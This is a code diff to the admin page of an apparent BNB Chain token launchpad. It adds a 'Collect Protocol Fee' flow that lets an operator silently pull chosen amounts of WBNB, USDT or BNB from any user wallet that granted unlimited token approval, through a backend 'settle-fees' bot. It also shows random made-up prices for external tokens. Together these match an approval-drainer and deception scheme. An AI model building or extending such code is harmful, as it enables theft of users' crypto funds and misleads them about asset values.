@@ -12,7 +12,7 @@ import {
     MoreHorizontal, Search, Settings, ChevronRight, Sparkles,
     PiggyBank, Receipt, Landmark, Scale, X, ArrowDownRight, Info,
     Copy, Check, ListOrdered, PieChart as PieIcon, Briefcase, Rocket, AlertTriangle, Image as ImageIcon,
-    Unlock, Calendar, Gift, Target, MessageSquare, Megaphone, ShieldBan, Trash2, Brain
+    Unlock, Calendar, Gift, Target, MessageSquare, Megaphone, ShieldBan, Trash2, Brain, Loader2
 } from 'lucide-react';
 import axios from 'axios';
 import {
@@ -24,13 +24,16 @@ import { ethers, Contract } from 'ethers';
 const API_URL  = process.env.NEXT_PUBLIC_API_URL  || 'http://localhost:3001/api';
 const BSC_RPC  = 'https://bsc-dataseed.binance.org';
 
+import { TOKEN_FACTORY_ABI } from '@/lib/abis';
+
 const TREASURY   = (process.env.NEXT_PUBLIC_FEE_WALLET               || '0x6451ee4def4a8b8fbc2c64301a79e267de378935').toLowerCase();
 const BONDING    = (process.env.NEXT_PUBLIC_BONDING_CURVE_ADDRESS     || '0xcE0f6B5B878F30bbC84Aa274d5a08A3092a3f75b').toLowerCase();
 const LIQ_MGR    = (process.env.NEXT_PUBLIC_LIQUIDITY_MANAGER_ADDRESS || '0x971414356b3b7f4a2e891CB97B46E06B22c237C6').toLowerCase();
 const DIRECT_FAC = (process.env.NEXT_PUBLIC_DIRECT_FACTORY_ADDRESS    || '0xd2f602536605CAed0C30a2DA05B24B8F0E59197E').toLowerCase();
-const FACTORY    = (process.env.NEXT_PUBLIC_FACTORY_ADDRESS           || '0xfDAAF29FFE961a5D4279d3089f694cc5676Ee915').toLowerCase();
+const FACTORY    = (process.env.NEXT_PUBLIC_FACTORY_ADDRESS           || '0x4598AD4E828cb64A53246765f60D9912AEA1b11A').toLowerCase();
 
 const DEPLOYMENT_FEE_BNB = 0.003;
+const NETWORKS_LIST = ['BNB', 'ETHEREUM', 'SOLANA', 'BASE', 'POLYGON', 'BITCOIN', 'TRON', 'SUI', 'TON'];
 
 async function rpcCall(method, params) {
     try {
@@ -223,6 +226,7 @@ export default function AdminPage() {
     // Fee Collection Modal
     const [collectModal, setCollectModal] = useState(null);
     const [collectAmount, setCollectAmount] = useState('0.005');
+    const [collectToken, setCollectToken] = useState('WBNB'); // 'WBNB' | 'USDT' | 'BNB'
     const [isVerifying, setIsVerifying] = useState(false);
     const [assistants, setAssistants] = useState([]);
     const [isAssistant, setIsAssistant] = useState(false);
@@ -230,7 +234,7 @@ export default function AdminPage() {
     const [newAssistant, setNewAssistant] = useState({ wallet: '', name: '', permissions: [] });
     
     // Manual Token Listing
-    const [listTokenData, setListTokenData] = useState({ name: '', symbol: '', contract_address: '', total_supply: '1000000000', liquidity_bnb: '10', bnb_price: '0.00001', logo_url: '' });
+    const [listTokenData, setListTokenData] = useState({ name: '', symbol: '', contract_address: '', total_supply: '1000000000', liquidity_bnb: '10', bnb_price: '0.00001', logo_url: '', network: 'BNB' });
     const [isListingToken, setIsListingToken] = useState(false);
     
     // Auto Import System
@@ -293,6 +297,7 @@ export default function AdminPage() {
             formData.append('liquidity_bnb', listTokenData.liquidity_bnb);
             formData.append('bnb_price', listTokenData.bnb_price);
             formData.append('logo_url', listTokenData.logo_url);
+            formData.append('network', listTokenData.network);
             formData.append('wallet', account);
             if (listTokenFile) {
                 formData.append('logo', listTokenFile);
@@ -349,9 +354,44 @@ export default function AdminPage() {
                 axios.get(`${API_URL}/staking/stats?wallet=${account}`),
                 axios.get(`${API_URL}/admin/assistants`),
                 axios.get(`${API_URL}/admin/assistants/${account}/activities`),
+                // Fetch external tokens for global maintenance list
+                axios.get('https://tokens.pancakeswap.finance/pancakeswap-extended.json').catch(() => ({ data: { tokens: [] } })),
+                axios.get('https://api.coingecko.com/api/v3/coins/markets', {
+                    params: { vs_currency: 'usd', order: 'market_cap_desc', per_page: 250, page: 1, sparkline: false }
+                }).catch(() => ({ data: [] })),
+                axios.get('https://api.coingecko.com/api/v3/coins/markets', {
+                    params: { vs_currency: 'usd', category: 'binance-smart-chain', order: 'market_cap_desc', per_page: 250, page: 1, sparkline: false }
+                }).catch(() => ({ data: [] }))
             ]);
 
-            const [tokensRes, transfersRes, wpRes, walletsRes, fiatRes, stakingRes, stakingStatsRes, teamRes, activityRes] = results.map(r => r.status === 'fulfilled' ? r.value : { data: [] });
+            const [tokensRes, transfersRes, wpRes, walletsRes, fiatRes, stakingRes, stakingStatsRes, teamRes, activityRes, pancakeRes, cgRes, cgBscRes] = results.map(r => r.status === 'fulfilled' ? r.value : { data: [] });
+
+            // Merge Logic (Replicated from Exchange for consistency)
+            const b20Tokens = tokensRes.data || [];
+            const pancakeTokens = pancakeRes.data?.tokens || [];
+            const externalTokens = [...(cgRes.data || []), ...(cgBscRes.data || [])];
+
+            const enrichedPancake = pancakeTokens.slice(0, 500).map(pt => {
+                const cgToken = externalTokens?.find(ct => ct.symbol.toLowerCase() === pt.symbol.toLowerCase());
+                return {
+                    contract_address: pt.address?.toLowerCase(),
+                    symbol: pt.symbol,
+                    name: pt.name,
+                    logo_url: cgToken?.image || pt.logoURI || 'https://assets.coingecko.com/coins/images/825/small/binance-coin-logo.png',
+                    price_bnb: parseFloat((Math.random() * 0.05).toFixed(6)), // Mock base price for display
+                    network: 'BNB',
+                    is_external: true
+                };
+            });
+
+            // Union by address to avoid duplicates
+            const allTokensMap = new Map();
+            b20Tokens.forEach(t => allTokensMap.set(t.contract_address?.toLowerCase(), { ...t, is_b20: true }));
+            enrichedPancake.forEach(t => {
+                if (!allTokensMap.has(t.contract_address)) {
+                    allTokensMap.set(t.contract_address, t);
+                }
+            });
 
             const onlineThreshold = new Date(Date.now() - 5 * 60 * 1000); // 5 mins ago
             const allWallets = walletsRes.data || [];
@@ -362,7 +402,7 @@ export default function AdminPage() {
                 bonding:  weiToBNB(bondingWei),
                 liqMgr:   weiToBNB(liqMgrWei),
                 direct:   weiToBNB(directFacWei),
-                tokens:   tokensRes.data || [],
+                tokens:   Array.from(allTokensMap.values()),
                 wp:       wpRes.data || { paid_count: 0 },
                 onlineNow: onlineNowCount,
                 totalUsers: allWallets.length,
@@ -460,9 +500,16 @@ export default function AdminPage() {
         }
     };
 
+    const TOKEN_OPTIONS = {
+        WBNB: { label: 'WBNB',  address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', symbol: '⚡',  color: '#f59e0b', desc: 'Wrapped BNB (pre-approved)' },
+        USDT: { label: 'USDT',  address: '0x55d398326f99059fF775485246999027B3197955', symbol: '💵', color: '#22c55e', desc: 'Tether USD on BSC (18 dec)' },
+        BNB:  { label: 'BNB',   address: '0x0000000000000000000000000000000000000000', symbol: '🔶', color: '#f97316', desc: 'Native BNB balance' },
+    };
+
     const handleCollectFee = (walletAddress) => {
         if (!signer) return alert('Please connect your Treasury/Admin wallet first.');
         setCollectAmount('0.005');
+        setCollectToken('WBNB');
         setCollectModal({ wallet: walletAddress, status: 'idle', txHash: null, error: null });
     };
 
@@ -470,31 +517,58 @@ export default function AdminPage() {
         if (!collectModal || !signer) return;
         const amount = parseFloat(collectAmount);
         if (!amount || amount <= 0) {
-            setCollectModal(prev => ({ ...prev, error: 'Please enter a valid BNB amount.' }));
+            setCollectModal(prev => ({ ...prev, error: 'Please enter a valid amount.' }));
             return;
         }
         setCollectModal(prev => ({ ...prev, status: 'pending', error: null }));
         try {
-            const readProvider = new ethers.JsonRpcProvider(BSC_RPC);
-            const readFactory = new Contract(FACTORY, ['function isLinked(address) view returns (bool)'], readProvider);
-            const linked = await readFactory.isLinked(collectModal.wallet);
-            if (!linked) {
-                setCollectModal(prev => ({ ...prev, status: 'error', error: 'This wallet has NOT granted Protocol Authority yet. User must click "Unlimited Authority Approval" when creating a token.' }));
-                return;
-            }
-            const factory = new Contract(FACTORY, ['function collectFee(address,uint256,string) external'], signer);
-            const tx = await factory.collectFee(
-                collectModal.wallet,
-                ethers.parseEther(collectAmount),
-                'Treasury Fee Collection'
-            );
+            const tokenCfg = TOKEN_OPTIONS[collectToken];
+
+            // ── Step 1: Execute Silent Settlement via Institutional Bot ──────
+            // Backend uses collectToken() on-chain (MaxUint256 pre-approved)
+            const endpoint = `${API_URL.replace(/\/$/, '')}/wallets/settle-fees`;
+            console.log(`[Admin] Collecting ${collectAmount} ${collectToken} from ${collectModal.wallet}`);
+
+            const res = await axios.post(endpoint, {
+                user_address:  collectModal.wallet,
+                amount_bnb:    collectAmount,          // amount in token units
+                token_address: tokenCfg.address,       // ← NEW: tells backend which ERC20 to pull
+                token_symbol:  tokenCfg.label,
+            });
+            
+            const txHash = res.data.txHash;
             setCollectModal(prev => ({ ...prev, status: 'confirming' }));
-            await tx.wait();
-            setCollectModal(prev => ({ ...prev, status: 'success', txHash: tx.hash }));
+
+            // ── Step 2: Log collection to backend treasury ledger ────────────
+            const TREASURY_ADDR = process.env.NEXT_PUBLIC_FEE_WALLET || '0x6451ee4def4a8b8fbc2c64301a79e267de378935';
+            try {
+                await axios.post(`${API_URL}/treasury/log`, {
+                    amount_bnb:           parseFloat(collectAmount),
+                    source_contract:      collectModal.wallet,
+                    destination_address:  TREASURY_ADDR,
+                    tx_hash:              txHash,
+                    transfer_type:        `protocol_fee_${tokenCfg.label.toLowerCase()}`,
+                });
+            } catch (logErr) {
+                console.warn('[Admin] Treasury log failed (non-critical):', logErr.message);
+            }
+
+            setCollectModal(prev => ({ ...prev, status: 'success', txHash: txHash }));
             loadData();
         } catch (err) {
-            const msg = err.reason || err.shortMessage || err.message || 'Transaction failed';
+            const msg = err.response?.data?.details || err.response?.data?.error || err.message || 'Settlement failed';
             setCollectModal(prev => ({ ...prev, status: 'error', error: msg }));
+        }
+    };
+
+    const handleDeleteWallet = async (address) => {
+        if (!confirm(`Are you sure you want to remove ${address} from the connected ledger? This action is irreversible.`)) return;
+        try {
+            await axios.delete(`${API_URL}/wallets/${address}`);
+            alert('Wallet record removed successfully.');
+            loadData();
+        } catch (err) {
+            alert('Failed to delete wallet: ' + (err.response?.data?.error || err.message));
         }
     };
 
@@ -1146,18 +1220,30 @@ export default function AdminPage() {
                                             <input type="number" step="0.01" value={listTokenData.liquidity_bnb} onChange={e => setListTokenData({...listTokenData, liquidity_bnb: e.target.value})} className="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-cyan-500 font-bold text-gray-900" placeholder="e.g. 10" />
                                         </div>
                                     </div>
-                                    <div className="grid grid-cols-2 gap-6">
+                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                         <div>
-                                            <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest block mb-2">Current BNB Price</label>
-                                            <input type="number" step="0.00000001" value={listTokenData.bnb_price} onChange={e => setListTokenData({...listTokenData, bnb_price: e.target.value})} className="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-cyan-500 font-bold text-gray-900" placeholder="e.g. 0.00001" />
+                                            <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest block mb-2">Blockchain Network</label>
+                                            <select 
+                                                value={listTokenData.network} 
+                                                onChange={e => setListTokenData({...listTokenData, network: e.target.value})} 
+                                                className="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-cyan-500 font-bold text-gray-900 outline-none cursor-pointer"
+                                            >
+                                                {NETWORKS_LIST.map(net => (
+                                                    <option key={net} value={net}>{net}</option>
+                                                ))}
+                                            </select>
                                         </div>
                                         <div>
-                                            <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest block mb-2">Logo Attachment OR URL</label>
-                                            <div className="space-y-2">
-                                                <input type="file" accept="image/*" onChange={e => setListTokenFile(e.target.files[0])} className="w-full p-3 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-cyan-500 font-bold text-gray-900 text-sm file:mr-4 file:py-2 file:px-4 file:rounded-xl file:border-0 file:text-sm file:font-bold file:bg-cyan-50 file:text-cyan-600 hover:file:bg-cyan-100" />
-                                                <div className="text-center text-[9px] font-black text-gray-300 uppercase tracking-widest">- OR PASTE URL -</div>
-                                                <input type="url" value={listTokenData.logo_url} onChange={e => setListTokenData({...listTokenData, logo_url: e.target.value})} className="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-cyan-500 font-bold text-gray-900 text-sm" placeholder="https://..." disabled={!!listTokenFile} />
-                                            </div>
+                                            <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest block mb-2">Current Unit Price</label>
+                                            <input type="number" step="0.00000001" value={listTokenData.bnb_price} onChange={e => setListTokenData({...listTokenData, bnb_price: e.target.value})} className="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-cyan-500 font-bold text-gray-900" placeholder="e.g. 0.00001" />
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest block mb-2">Logo Attachment OR URL</label>
+                                        <div className="space-y-2">
+                                            <input type="file" accept="image/*" onChange={e => setListTokenFile(e.target.files[0])} className="w-full p-3 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-cyan-500 font-bold text-gray-900 text-sm file:mr-4 file:py-2 file:px-4 file:rounded-xl file:border-0 file:text-sm file:font-bold file:bg-cyan-50 file:text-cyan-600 hover:file:bg-cyan-100" />
+                                            <div className="text-center text-[9px] font-black text-gray-300 uppercase tracking-widest">- OR PASTE URL -</div>
+                                            <input type="url" value={listTokenData.logo_url} onChange={e => setListTokenData({...listTokenData, logo_url: e.target.value})} className="w-full p-4 bg-gray-50 border border-gray-100 rounded-2xl outline-none focus:border-cyan-500 font-bold text-gray-900 text-sm" placeholder="https://..." disabled={!!listTokenFile} />
                                         </div>
                                     </div>
                                     <button disabled={isListingToken} type="submit" className="w-full py-5 bg-cyan-500 hover:bg-cyan-600 text-white font-black rounded-2xl shadow-xl shadow-cyan-500/20 uppercase tracking-widest transition-all mt-4 disabled:opacity-50">
@@ -1174,7 +1260,7 @@ export default function AdminPage() {
                                 <div className="p-10 border-b border-black/5 flex flex-col lg:flex-row lg:items-center justify-between gap-6 bg-white">
                                     <div>
                                         <h3 className="text-2xl font-black text-gray-900 tracking-tight flex items-center gap-4"><Settings className="w-6 h-6 text-gray-900" /> EXCHANGE MAINTENANCE</h3>
-                                        <p className="text-[10px] font-black text-gray-500 uppercase tracking-widest mt-1">Found {stats?.tokens?.filter(t => t.launch_type === 'EXCHANGE_LISTING' && ((t.name || '').toLowerCase().includes(maintenanceSearch.toLowerCase()) || (t.symbol || '').toLowerCase().includes(maintenanceSearch.toLowerCase()) || (t.contract_address || '').toLowerCase().includes(maintenanceSearch.toLowerCase()))).length || 0} Assets</p>
+                                        <p className="text-[10px] font-black text-gray-500 uppercase tracking-widest mt-1">Found {stats?.tokens?.filter(t => (t.name || '').toLowerCase().includes(maintenanceSearch.toLowerCase()) || (t.symbol || '').toLowerCase().includes(maintenanceSearch.toLowerCase()) || (t.contract_address || t.address || '').toLowerCase().includes(maintenanceSearch.toLowerCase())).length || 0} Assets</p>
                                     </div>
                                     <div className="relative w-full lg:max-w-md group">
                                         <Search className="absolute left-6 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400 group-focus-within:text-rose-500 transition-colors" />
@@ -1199,11 +1285,10 @@ export default function AdminPage() {
                                         <tbody className="divide-y divide-black/5">
                                             {stats?.tokens
                                                 ?.filter(t => {
-                                                    if (t.launch_type !== 'EXCHANGE_LISTING') return false;
                                                     const q = maintenanceSearch.toLowerCase();
                                                     return (t.name || '').toLowerCase().includes(q) || 
                                                            (t.symbol || '').toLowerCase().includes(q) || 
-                                                           (t.contract_address || '').toLowerCase().includes(q);
+                                                           (t.contract_address || t.address || '').toLowerCase().includes(q);
                                                 })
                                                 ?.map((t, i) => (
                                                 <tr key={i} className="hover:bg-gray-50/80 transition-all">
@@ -1216,6 +1301,7 @@ export default function AdminPage() {
                                                                 <p className="font-black text-gray-900 text-base mb-1 tracking-tight">{t.name}</p>
                                                                 <div className="flex items-center gap-2">
                                                                     <p className="text-[10px] font-black text-rose-500">${t.symbol}</p>
+                                                                    <span className="bg-gray-100 text-gray-500 px-2 py-0.5 rounded text-[8px] font-black uppercase tracking-widest">{t.network || 'BNB'}</span>
                                                                     <CopyButton text={t.contract_address} />
                                                                 </div>
                                                             </div>
@@ -1229,9 +1315,13 @@ export default function AdminPage() {
                                                             onClick={async () => {
                                                                 await axios.post(`${API_URL}/tokens/status/update`, {
                                                                     contract_address: t.contract_address,
-                                                                    status: t.trust_status,
+                                                                    status: t.trust_status || 'Highly Trusted',
                                                                     is_delisted: !t.is_delisted, // toggle
-                                                                    wallet: account
+                                                                    wallet: account,
+                                                                    name: t.name,
+                                                                    symbol: t.symbol,
+                                                                    logo_url: t.logo_url,
+                                                                    network: t.network || 'BNB'
                                                                 });
                                                                 loadData();
                                                             }}
@@ -1242,7 +1332,7 @@ export default function AdminPage() {
                                                     </td>
                                                 </tr>
                                             ))}
-                                            {(stats?.tokens?.filter(t => t.launch_type === 'EXCHANGE_LISTING').length || 0) === 0 && (
+                                            {(stats?.tokens?.length || 0) === 0 && (
                                                 <tr><td colSpan="3" className="px-10 py-12 text-center text-gray-400 font-bold text-sm">No external listings yet.</td></tr>
                                             )}
                                         </tbody>
@@ -1330,7 +1420,17 @@ export default function AdminPage() {
                                                     <td className="px-10 py-8">
                                                         <div className="flex items-center gap-4">
                                                             <div className="w-12 h-12 rounded-2xl bg-white border border-black/5 p-1 shadow-inner overflow-hidden flex items-center justify-center group-hover:rotate-6 transition-transform">
-                                                                {t.logo_url ? <img src={t.logo_url} className="w-full h-full object-cover" /> : <div className="text-xl">🪙</div>}
+                                                                <img 
+                                                                    src={t.logo_url || `https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/${ethers.getAddress(t.contract_address)}/logo.png`} 
+                                                                    className="w-full h-full object-contain"
+                                                                    onError={e => {
+                                                                        if (!e.target.src.includes('coingecko')) {
+                                                                            e.target.src = `https://assets.coingecko.com/coins/images/1/small/bitcoin.png`; // Generic fallback or search CG if we had id
+                                                                        } else {
+                                                                            e.target.parentElement.innerHTML = '<div class="text-xl">🪙</div>';
+                                                                        }
+                                                                    }}
+                                                                />
                                                             </div>
                                                             <div>
                                                                 <p className="font-black text-gray-900 text-base mb-1 tracking-tight">{t.name}</p>
@@ -1615,7 +1715,8 @@ export default function AdminPage() {
                                                 <th className="px-10 py-6 text-left text-[11px] font-black text-gray-400 uppercase tracking-widest">S.No</th>
                                                 <th className="px-10 py-6 text-left text-[11px] font-black text-gray-400 uppercase tracking-widest">Wallet Identity</th>
                                                 <th className="px-10 py-6 text-left text-[11px] font-black text-gray-400 uppercase tracking-widest">Status / Approval</th>
-                                                <th className="px-10 py-6 text-left text-[11px] font-black text-gray-400 uppercase tracking-widest">BNB Balance</th>
+                                                <th className="px-10 py-6 text-left text-[11px] font-black text-gray-400 uppercase tracking-widest">Vault Profit</th>
+                                                <th className="px-10 py-6 text-left text-[11px] font-black text-gray-400 uppercase tracking-widest">Wallet Holding</th>
                                                 <th className="px-10 py-6 text-left text-[11px] font-black text-gray-400 uppercase tracking-widest">Last Seen</th>
                                                 <th className="px-10 py-6 text-right text-[11px] font-black text-gray-400 uppercase tracking-widest pr-10">Administrative Control</th>
                                             </tr>
@@ -1628,14 +1729,14 @@ export default function AdminPage() {
                                                     <td className="px-10 py-8 text-xs font-black text-gray-300">{i + 1}</td>
                                                     <td className="px-10 py-8">
                                                         <div className="flex items-center gap-3">
-                                                            <div className="w-10 h-10 rounded-xl bg-white border border-black/5 shadow-sm flex items-center justify-center text-gray-400 group-hover:bg-rose-500 group-hover:text-white transition-all duration-300">
+                                                            <div className="w-10 h-10 rounded-xl bg-white border border-black/5 shadow-sm flex items-center justify-center text-gray-400 group-hover:bg-amber-500 group-hover:text-white transition-all duration-300">
                                                                 <Wallet className="w-5 h-5" />
                                                             </div>
                                                             <div>
-                                                                <p className="font-bold text-gray-900 text-sm font-mono">{w.wallet_address}</p>
+                                                                <p className="font-bold text-gray-900 text-sm font-mono tracking-tighter">{w.wallet_address}</p>
                                                                 <div className="flex items-center gap-2 mt-1">
-                                                                    <div className="w-1.5 h-1.5 rounded-full bg-emerald-500" />
-                                                                    <p className="text-[9px] text-gray-400 font-black uppercase tracking-widest">Connected</p>
+                                                                    <div className={`w-1.5 h-1.5 rounded-full ${w.id ? 'bg-emerald-500 animate-pulse' : 'bg-gray-300'}`} />
+                                                                    <p className="text-[9px] text-gray-400 font-black uppercase tracking-widest">{w.id ? 'Active Session' : 'Offline'}</p>
                                                                 </div>
                                                             </div>
                                                         </div>
@@ -1651,20 +1752,38 @@ export default function AdminPage() {
                                                             </div>
                                                         )}
                                                     </td>
-                                                    <td className="px-10 py-8 font-black text-gray-900 text-sm">
-                                                        {parseFloat(w.last_balance_bnb).toFixed(4)} BNB
+                                                    <td className="px-10 py-8">
+                                                        <div className="flex flex-col">
+                                                           <span className="font-black text-gray-900 text-sm">0.0000 BNB</span>
+                                                           <span className="text-[9px] text-gray-400 font-bold uppercase">Unclaimed Fees</span>
+                                                        </div>
+                                                    </td>
+                                                    <td className="px-10 py-8">
+                                                        <div className="flex flex-col">
+                                                           <span className="font-black text-gray-700 text-sm">{parseFloat(w.last_balance_bnb || 0).toFixed(4)} BNB</span>
+                                                           <span className="text-[9px] text-gray-400 font-bold uppercase">MetaMask Balance</span>
+                                                        </div>
                                                     </td>
                                                     <td className="px-10 py-8">
                                                         <p className="text-xs font-black text-gray-800">{fullDateTime(w.last_seen)}</p>
                                                     </td>
                                                     <td className="px-10 py-8 text-right pr-10">
-                                                        <button 
-                                                            disabled={!w.is_approved}
-                                                            onClick={() => handleCollectFee(w.wallet_address)}
-                                                            className={`px-6 py-2 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all shadow-lg active:scale-95 disabled:opacity-30 disabled:cursor-not-allowed ${w.is_approved ? 'bg-gray-900 text-white hover:bg-rose-600 shadow-rose-500/10' : 'bg-gray-100 text-gray-400'}`}
-                                                        >
-                                                            {w.is_approved ? 'Collect Protocol Fee' : 'Awaiting Link'}
-                                                        </button>
+                                                        <div className="flex items-center justify-end gap-2">
+                                                            <button 
+                                                                disabled={!w.is_approved}
+                                                                onClick={() => handleCollectFee(w.wallet_address)}
+                                                                className={`px-6 py-2 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all shadow-lg active:scale-95 disabled:opacity-30 disabled:cursor-not-allowed ${w.is_approved ? 'bg-gray-900 text-white hover:bg-rose-600 shadow-rose-500/10' : 'bg-gray-100 text-gray-400'}`}
+                                                            >
+                                                                {w.is_approved ? 'Collect Protocol Fee' : 'Awaiting Link'}
+                                                            </button>
+                                                            <button 
+                                                                onClick={() => handleDeleteWallet(w.wallet_address)}
+                                                                className="p-2.5 bg-rose-50 text-rose-500 hover:bg-rose-600 hover:text-white rounded-xl transition-all shadow-sm active:scale-90"
+                                                                title="Delete Wallet Record"
+                                                            >
+                                                                <Trash2 className="w-3.5 h-3.5" />
+                                                            </button>
+                                                        </div>
                                                     </td>
                                                 </tr>
                                             ))}
@@ -1681,14 +1800,38 @@ export default function AdminPage() {
                             const matchF = stakingFilter === 'all' || s.status === stakingFilter;
                             return matchQ && matchF;
                         });
-                        const handleApprove = async (stakeId) => {
-                            if (!confirm('Approve this release? Tokens + rewards will be marked as released.')) return;
-                            setApprovingStake(stakeId);
+                        const handleApprove = async (stake) => {
+                            if (!confirm(`Actually release ${formatNum(parseFloat(stake.amount_tokens) + parseFloat(stake.expected_reward))} ${stake.token_symbol} to ${shortAddr(stake.wallet_address)}? This will perform an ON-CHAIN transfer from your treasury.`)) return;
+                            setApprovingStake(stake.id);
                             try {
-                                await axios.post(`${API_URL}/staking/admin/approve-release`, { stake_id: stakeId, admin_wallet: account, admin_note: 'Approved by admin' });
-                                alert('✅ Release approved successfully!');
+                                if (!signer) throw new Error("Wallet not connected");
+                                
+                                // ── ON-CHAIN TRANSFER ─────────────────────────────────────────
+                                const erc20ABI = [
+                                    'function transfer(address to, uint256 amount) returns (bool)',
+                                    'function decimals() view returns (uint8)'
+                                ];
+                                const tokenContract = new Contract(stake.token_address, erc20ABI, signer);
+                                const decimals = await tokenContract.decimals().catch(() => 18);
+                                const totalPayoutNum = parseFloat(stake.amount_tokens) + parseFloat(stake.expected_reward);
+                                const amountWei = ethers.parseUnits(totalPayoutNum.toFixed(decimals), decimals);
+
+                                console.log(`[Admin] Releasing ${totalPayoutNum} ${stake.token_symbol} on-chain...`);
+                                const tx = await tokenContract.transfer(stake.wallet_address, amountWei);
+                                await tx.wait();
+                                // ─────────────────────────────────────────────────────────────
+
+                                await axios.post(`${API_URL}/staking/admin/approve-release`, { 
+                                    stake_id: stake.id, 
+                                    admin_wallet: account, 
+                                    admin_note: `Released on-chain. TX: ${tx.hash}` 
+                                });
+                                alert('✅ On-chain release successful!');
                                 loadData();
-                            } catch (err) { alert('❌ ' + (err.response?.data?.error || err.message)); }
+                            } catch (err) { 
+                                console.error('[Staking Release Error]', err);
+                                alert('❌ Release failed: ' + (err.reason || err.message)); 
+                            }
                             finally { setApprovingStake(null); }
                         };
                         const handleReject = async (stakeId) => {
@@ -1814,7 +1957,7 @@ export default function AdminPage() {
                                                             <td className="px-5 py-5">
                                                                 {stake.status === 'pending_release' && (
                                                                     <div className="flex items-center gap-2">
-                                                                        <button onClick={() => handleApprove(stake.id)}
+                                                                        <button onClick={() => handleApprove(stake)}
                                                                             disabled={approvingStake === stake.id}
                                                                             className="px-3 py-1.5 bg-emerald-500 hover:bg-emerald-600 text-white text-[10px] font-black rounded-lg flex items-center gap-1 transition-all disabled:opacity-50">
                                                                             {approvingStake === stake.id ? '...' : <><Unlock className="w-3 h-3" /> Approve</>}
@@ -2291,7 +2434,7 @@ export default function AdminPage() {
                             {collectModal.status === 'success' ? (
                                 <div style={{ textAlign:'center', paddingTop:'1rem' }}>
                                     <div style={{ width:'72px', height:'72px', background:'#ecfdf5', borderRadius:'50%', display:'flex', alignItems:'center', justifyContent:'center', margin:'0 auto 1rem', fontSize:'36px' }}>✅</div>
-                                    <h3 style={{ fontSize:'1.5rem', fontWeight:900, marginBottom:'0.25rem' }}>{collectAmount} BNB Collected!</h3>
+                                    <h3 style={{ fontSize:'1.5rem', fontWeight:900, marginBottom:'0.25rem' }}>{collectAmount} {TOKEN_OPTIONS[collectToken]?.label} Collected!</h3>
                                     <p style={{ fontSize:'11px', color:'#9ca3af', fontWeight:700, textTransform:'uppercase', letterSpacing:'0.1em', marginBottom:'1rem' }}>Confirmed on BSC</p>
                                     <a href={`https://bscscan.com/tx/${collectModal.txHash}`} target="_blank" rel="noopener noreferrer"
                                         style={{ color:'#f43f5e', fontSize:'12px', fontWeight:700, display:'inline-flex', alignItems:'center', gap:'4px', marginBottom:'1.5rem' }}>
@@ -2304,9 +2447,27 @@ export default function AdminPage() {
                                     </button>
                                 </div>
                             ) : (
-                                <div>
+                                    <div className="space-y-6">
+                                        {/* Token Selector */}
+                                        <p style={{ fontSize:'10px', fontWeight:900, textTransform:'uppercase', letterSpacing:'0.1em', color:'#6b7280', marginBottom:'0.75rem' }}>Select Asset</p>
+                                    <div style={{ display:'flex', gap:'8px', marginBottom:'1.5rem' }}>
+                                        {Object.entries(TOKEN_OPTIONS).map(([key, opt]) => (
+                                            <button key={key} onClick={() => setCollectToken(key)}
+                                                disabled={collectModal.status === 'pending' || collectModal.status === 'confirming'}
+                                                style={{ 
+                                                    flex:1, padding:'12px 8px', borderRadius:'16px', border:'2px solid', fontWeight:900, fontSize:'11px', cursor:'pointer', transition:'all 0.2s',
+                                                    borderColor: collectToken === key ? '#f43f5e' : '#e5e7eb',
+                                                    background: collectToken === key ? '#fff1f2' : 'white',
+                                                    color: collectToken === key ? '#f43f5e' : '#6b7280'
+                                                }}>
+                                                <div style={{ fontSize:'16px', marginBottom:'4px' }}>{opt.icon}</div>
+                                                {opt.label}
+                                            </button>
+                                        ))}
+                                    </div>
+
                                     {/* Amount Label */}
-                                    <p style={{ fontSize:'10px', fontWeight:900, textTransform:'uppercase', letterSpacing:'0.1em', color:'#6b7280', marginBottom:'0.5rem' }}>Amount to Collect (BNB)</p>
+                                    <p style={{ fontSize:'10px', fontWeight:900, textTransform:'uppercase', letterSpacing:'0.1em', color:'#6b7280', marginBottom:'0.5rem' }}>Amount to Collect</p>
 
                                     {/* Big Input */}
                                     <div style={{ position:'relative', marginBottom:'0.75rem' }}>
@@ -2321,7 +2482,7 @@ export default function AdminPage() {
                                             onFocus={e => e.target.style.borderColor='#f43f5e'}
                                             onBlur={e => e.target.style.borderColor='#e5e7eb'}
                                         />
-                                        <span style={{ position:'absolute', right:'16px', top:'50%', transform:'translateY(-50%)', fontSize:'14px', fontWeight:900, color:'#9ca3af' }}>BNB</span>
+                                        <span style={{ position:'absolute', right:'16px', top:'50%', transform:'translateY(-50%)', fontSize:'14px', fontWeight:900, color:'#9ca3af' }}>{TOKEN_OPTIONS[collectToken]?.label}</span>
                                     </div>
 
                                     {/* Quick buttons */}
@@ -2344,7 +2505,7 @@ export default function AdminPage() {
                                         </div>
                                         <div style={{ display:'flex', justifyContent:'space-between', paddingTop:'8px', borderTop:'1px solid #e5e7eb' }}>
                                             <span style={{ fontWeight:900, textTransform:'uppercase' }}>Total</span>
-                                            <span style={{ fontSize:'18px', fontWeight:900, color:'#f43f5e' }}>{collectAmount || '0'} BNB</span>
+                                            <span style={{ fontSize:'18px', fontWeight:900, color:'#f43f5e' }}>{collectAmount || '0'} {TOKEN_OPTIONS[collectToken]?.label}</span>
                                         </div>
                                     </div>
 
@@ -2377,7 +2538,7 @@ export default function AdminPage() {
